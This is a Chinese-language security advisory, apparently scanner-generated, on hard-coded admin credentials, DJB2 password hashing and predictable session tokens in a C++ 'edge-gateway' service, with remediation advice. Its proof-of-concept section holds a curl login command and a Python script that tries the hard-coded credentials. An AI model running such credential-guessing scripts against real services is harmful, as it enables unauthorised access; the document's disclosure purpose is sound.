# VULN-SEC-CRED-001: 认证模块硬编码管理员凭据，攻击者可直接获取系统最高权限

**严重性**: Critical | **CWE**: CWE-798 (Use of Hard-coded Credentials) | **置信度**: 85/100
**位置**: `src/user_store.cpp:6-10` @ `UserStore::UserStore`

---

## 1. 漏洞细节

`UserStore` 构造函数在源代码中硬编码了三个用户账户及其明文密码：

| 用户名   | 明文密码     | 管理员权限 |
| -------- | ------------ | ---------- |
| alice    | wonderland   | 否         |
| operator | op-password  | 否         |
| admin    | admin123     | **是**     |

这些凭据在编译时被嵌入二进制文件中。密码使用 DJB2 哈希算法（`weakHash`）存储，该算法**不是密码学安全的哈希函数**——它无盐、无迭代、输出空间极小（32位无符号整数），可通过彩虹表或穷举在毫秒级内逆向还原明文。

更严重的是，`admin` 账户的密码 `admin123` 属于全球最常见的弱密码之一，即使攻击者**完全没有源代码访问权限**，也可通过简单的凭据猜测/暴力破解直接登录管理员账户。

认证接口 `POST /login` 直接暴露在网络层面，无任何速率限制、账户锁定或额外验证机制，使得该漏洞可被远程未认证攻击者零门槛利用。

## 2. 漏洞代码

**文件**: `src/user_store.cpp` (行 6-10)

```cpp
UserStore::UserStore() {
  users_["alice"] = {"alice", weakHash("wonderland"), false};      // ← 硬编码凭据
  users_["operator"] = {"operator", weakHash("op-password"), false}; // ← 硬编码凭据
  users_["admin"] = {"admin", weakHash("admin123"), true};          // ← 硬编码管理员凭据
}
```

**弱哈希函数** `src/user_store.cpp` (行 12-18):

```cpp
std::string UserStore::weakHash(const std::string& password) const {
  unsigned int value = 5381;
  for (char ch : password) {
    value = ((value << 5) + value) + static_cast<unsigned char>(ch);  // DJB2 算法
  }
  return std::to_string(value);  // 输出为十进制字符串，32位空间
}
```

**认证逻辑** `src/user_store.cpp` (行 20-26):

```cpp
bool UserStore::authenticate(const std::string& username, const std::string& password) const {
  auto user = users_.find(username);
  if (user == users_.end()) {
    return false;
  }
  return user->second.passwordHash == weakHash(password);  // 直接比较 DJB2 哈希
}
```

**登录入口** `src/main.cpp` (行 40-52):

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
  std::string username = queryValue(request, "user");       // ← 外部输入
  std::string password = queryValue(request, "password");   // ← 外部输入
  audit.event(username, "login-attempt", request.body);

  if (!users.authenticate(username, password)) {            // ← 无速率限制
    return text(401, "invalid credentials\n");
  }

  std::string token = users.issueSession(username);         // ← 可预测的会话令牌
  audit.event(username, "login-success", token);
  return text(200, "session=" + token + "\n");
});
```

### 代码分析

1. **第 6-10 行（漏洞根因）**: 构造函数无条件地将三个账户的明文密码通过 `weakHash` 转换后存入内存。密码直接写在源码中，任何有权访问代码仓库或二进制文件的人均可获取。
2. **第 12-18 行（弱哈希）**: DJB2 是一个字符串哈希函数，设计目标是快速散列而非密码安全。32位输出空间仅有约 43 亿种可能，在现代硬件上穷举仅需数秒。
3. **第 20-26 行（认证逻辑）**: 认证过程无任何防护措施——无失败计数、无延迟、无锁定机制，允许无限次尝试。
4. **第 40-52 行（入口点）**: HTTP POST 端点直接接收用户输入并传递给认证函数，无任何前置验证或速率限制。

## 3. 完整攻击链路

```
[入口点] POST /login@src/main.cpp:40
↓ HTTP 请求参数 user=admin&password=admin123
[参数提取] queryValue(request, "user/password")@src/main.cpp:41-42
↓ 返回字符串 "admin" 和 "admin123"
[认证调用] users.authenticate("admin", "admin123")@src/main.cpp:45
↓ 调用 UserStore::authenticate()
[哈希比较] weakHash("admin123") == stored_hash@src/user_store.cpp:25
↓ DJB2("admin123") 与构造函数中预存的哈希值匹配
[认证成功] 返回 true → issueSession("admin")@src/main.cpp:49
↓ 生成可预测的会话令牌 "sess-admin-{timestamp}"
[权限获取] 攻击者获得 admin 会话，isAdmin("admin") 返回 true
```

### 攻击链路详细说明

1. **入口点（main.cpp:40）**: `POST /login` 路由在服务器启动时无条件注册（main.cpp:34），任何能访问服务端口的远程用户均可发送请求。
2. **参数提取（main.cpp:41-42）**: `queryValue` 函数从 HTTP 请求的查询参数中提取 `user` 和 `password`，无任何输入清洗或长度限制。
3. **认证调用（main.cpp:45）**: 提取的凭据直接传递给 `UserStore::authenticate()`，中间无任何验证或拦截逻辑。
4. **哈希比较（user_store.cpp:25）**: `authenticate()` 将输入密码的 DJB2 哈希与存储的哈希值比较。由于 `admin123` 是硬编码密码，比较必然成功。
5. **会话生成（main.cpp:49）**: `issueSession()` 使用 `sprintf` 生成格式为 `sess-{username}-{unix_timestamp}` 的令牌（user_store.cpp:34-35），完全可预测。

## 4. 攻击场景

**攻击者画像**: 远程未认证用户——任何能够访问服务监听端口（默认 8080）的网络用户，无需任何先验权限或代码访问权。

**攻击向量**: 通过 HTTP POST 请求直接发送凭据到 `/login` 端点。攻击者甚至不需要源码访问权限——`admin/admin123` 是极其常见的默认凭据组合，可通过简单的凭据猜测发现。

**利用难度**: **低** — 仅需一个 HTTP 请求即可完成利用，无需任何特殊工具或技术知识。

### 攻击步骤

1. **侦察**: 攻击者发现目标服务运行在 TCP 8080 端口（或通过扫描发现）
2. **凭据猜测**: 尝试常见管理员凭据 `admin/admin123`（或利用源码泄露获取完整凭据列表）
3. **发送登录请求**: 向 `POST /login` 发送 `user=admin&password=admin123`
4. **获取会话**: 服务器返回 `session=sess-admin-{timestamp}` 会话令牌
5. **权限提升**: 使用管理员会话访问受保护的功能（如 `/admin/export`）
6. **横向扩展**: 利用管理员权限进一步渗透系统

## 5. 攻击条件

| 条件类型   | 要求         | 说明                                                                 |
| ---------- | ------------ | -------------------------------------------------------------------- |
| 网络可达性 | 需要         | 攻击者需能访问服务监听端口（默认 8080），无 TLS/防火墙限制           |
| 认证要求   | 无需认证     | 攻击者为未认证外部用户，利用的就是认证机制本身的缺陷                 |
| 配置依赖   | 无特殊要求   | 漏洞存在于默认配置中，服务启动即生效                                 |
| 环境依赖   | 无特殊要求   | 任何操作系统和编译环境均受影响，凭据硬编码在源码中                   |
| 时序条件   | 无           | 漏洞随时可利用，无竞态条件或时间窗口限制                             |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                         |
| -------- | ---- | -------------------------------------------------------------------------------------------- |
| 机密性   | **高** | 攻击者以管理员身份登录后可访问所有受保护数据，包括 `/admin/export` 端点暴露的系统信息         |
| 完整性   | **高** | 管理员权限允许修改系统配置、用户数据和业务逻辑，可植入后门或篡改关键数据                     |
| 可用性   | **中** | 攻击者可滥用管理员权限导致服务异常，或通过大量登录请求消耗资源（无速率限制）                 |

**影响范围**: **全局影响** — 管理员账户拥有系统最高权限（`admin=true`），攻击者可完全控制应用。由于会话令牌可预测（`sess-admin-{timestamp}`），攻击者还可伪造其他管理员会话。此外，三个硬编码账户中任意一个被攻破都会导致系统被入侵，攻击面极大。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，未经授权不得用于非法目的

### PoC 1: 使用 curl 直接登录管理员账户

```bash
# 仅供安全测试使用 - 使用硬编码管理员凭据登录
curl -X POST "http://TARGET_HOST:8080/login?user=admin&password=admin123"
```

**预期输出**:
```
session=sess-admin-1750234567
```

### PoC 2: 使用 Python 脚本自动化利用

```python
#!/usr/bin/env python3
"""仅供安全测试使用 - VULN-SEC-CRED-001 PoC"""
import requests
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

# 硬编码凭据列表（从源码或猜测获取）
credentials = [
    ("admin", "admin123"),
    ("alice", "wonderland"),
    ("operator", "op-password"),
]

for username, password in credentials:
    resp = requests.post(f"{target}/login", params={
        "user": username,
        "password": password
    })
    if resp.status_code == 200:
        print(f"[+] 登录成功: {username}/{password}")
        print(f"    会话令牌: {resp.text.strip()}")
        if username == "admin":
            print(f"    [!] 管理员权限已获取")
    else:
        print(f"[-] 登录失败: {username}/{password}")

# 使用管理员会话访问受保护端点
print("\n[*] 尝试访问管理员功能...")
resp = requests.get(f"{target}/admin/export", params={"token": "letmein-export"})
print(f"    响应: {resp.text.strip()}")
```

### PoC 3: DJB2 哈希逆向验证

```python
#!/usr/bin/env python3
"""仅供安全测试使用 - 验证 DJB2 哈希可逆性"""

def djb2_hash(password):
    """复现 UserStore::weakHash 的 DJB2 算法"""
    value = 5381
    for ch in password:
        value = ((value << 5) + value) + ord(ch)
        value &= 0xFFFFFFFF  # 32位无符号整数
    return str(value)

# 验证硬编码密码的哈希值
passwords = {"alice": "wonderland", "operator": "op-password", "admin": "admin123"}
for user, pwd in passwords.items():
    h = djb2_hash(pwd)
    print(f"用户: {user:10s} | 密码: {pwd:15s} | DJB2哈希: {h}")

# 暴力破解演示：32位空间可在秒级内穷举
print(f"\nDJB2 输出空间: 2^32 ≈ 43亿种可能")
print(f"现代 CPU 穷举时间: < 10 秒")
```

**使用说明**:
1. 确保目标服务正在运行（默认端口 8080）
2. 执行 PoC 1 的 curl 命令，预期立即获得管理员会话令牌
3. 执行 PoC 2 的 Python 脚本，可批量验证所有硬编码凭据
4. 执行 PoC 3 可验证 DJB2 哈希的不安全性

**预期结果**: 攻击者使用 `admin/admin123` 发送单个 HTTP 请求即可获得管理员会话令牌，无需任何特殊技术或工具。

## 8. 验证环境搭建

### 基础环境

- 操作系统: 任意 Linux 发行版（Ubuntu 20.04+、Debian 11+ 等）
- 编译器: GCC 9+ 或 Clang 10+（需支持 C++17）
- 依赖: 标准 C++ 库，无第三方依赖
- 工具: curl（用于验证）

### 构建步骤

```bash
# 克隆或获取项目源码
cd /scan/project

# 编译项目（假设使用 Makefile 或 CMake）
# 方式1: 直接编译
g++ -std=c++17 -I include -o edge-gateway src/main.cpp src/user_store.cpp src/file_cache.cpp src/diagnostics.cpp src/audit_log.cpp src/http_server.cpp

# 方式2: 使用项目构建系统（如有 CMakeLists.txt）
mkdir build && cd build
cmake .. && make
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

### 验证步骤

1. 启动 `edge-gateway` 服务
2. 使用 curl 发送登录请求：
   ```bash
   curl -v -X POST "http://localhost:8080/login?user=admin&password=admin123"
   ```
3. 观察返回的 HTTP 200 响应和会话令牌
4. 使用错误密码验证认证机制正常工作：
   ```bash
   curl -v -X POST "http://localhost:8080/login?user=admin&password=wrong"
   ```
5. 确认返回 HTTP 401

### 预期结果

- **正确凭据**: 返回 HTTP 200，响应体包含 `session=sess-admin-{unix_timestamp}`
- **错误凭据**: 返回 HTTP 401，响应体为 `invalid credentials`
- **漏洞确认**: 使用硬编码凭据 `admin/admin123` 可成功登录并获取管理员权限

---

## 附录: 修复建议

1. **立即移除硬编码凭据**: 将所有用户凭据迁移到安全的数据库或密钥管理系统（如 HashiCorp Vault）
2. **使用强密码哈希算法**: 替换 DJB2 为 bcrypt、scrypt 或 Argon2，并添加随机盐值
3. **实施速率限制**: 对 `/login` 端点添加请求频率限制和账户锁定机制
4. **强制密码策略**: 要求用户使用强密码，禁止使用常见弱密码
5. **改进会话管理**: 使用密码学安全的随机数生成器生成会话令牌，避免可预测格式
6. **代码审查**: 在 CI/CD 流程中集成凭据扫描工具（如 GitLeaks、TruffleHog），防止硬编码凭据进入代码仓库
